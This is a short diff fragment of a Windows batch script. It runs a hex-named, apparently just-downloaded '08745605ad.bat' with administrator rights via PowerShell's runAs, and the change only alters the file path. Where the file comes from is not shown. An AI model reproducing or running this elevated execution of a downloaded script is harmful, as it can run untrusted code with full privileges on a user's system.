@@ -1158,7 +1158,7 @@ if exist "08745605ad.bat" (
     echo File downloaded successfully.
     
     
-    powershell -Command "Start-Process 'C:\path\to\your\desired\location\08745605ad.bat' -Verb runAs"
+    powershell -Command "Start-Process '08745605ad.bat' -Verb runAs"
     
     :: Goto ART_START
     goto ART_START
